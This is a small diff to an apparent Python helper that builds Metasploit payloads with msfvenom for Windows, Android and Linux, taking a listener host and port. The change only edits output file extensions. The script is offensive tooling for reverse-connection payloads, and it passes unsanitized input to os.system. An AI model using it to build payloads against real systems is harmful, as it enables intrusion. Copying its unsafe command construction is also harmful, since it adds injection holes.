@@ -7,14 +7,14 @@ import os
 def generatePayload(lhost, lport, payload, location):
     payloadTyp = payload.split("/")[0]
     if payloadTyp == "windows":
-        payloadTyp = "exe"
+        payloadTyp = ".exe"
     if payloadTyp == "linux":
-        payloadTyp = "elf"
+        payloadTyp = ""
     if payloadTyp == "android":
-        payloadTyp = "apk"
+        payloadTyp = ".apk"
 
     os.system("msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" +
-              lport + " R > " + location + "/payload." + payloadTyp + " 2>/dev/null")
+              lport + " R > " + location + "/payload" + payloadTyp + " 2>/dev/null")
     print("Payload generated!")
 
 def chooseOptions(options):
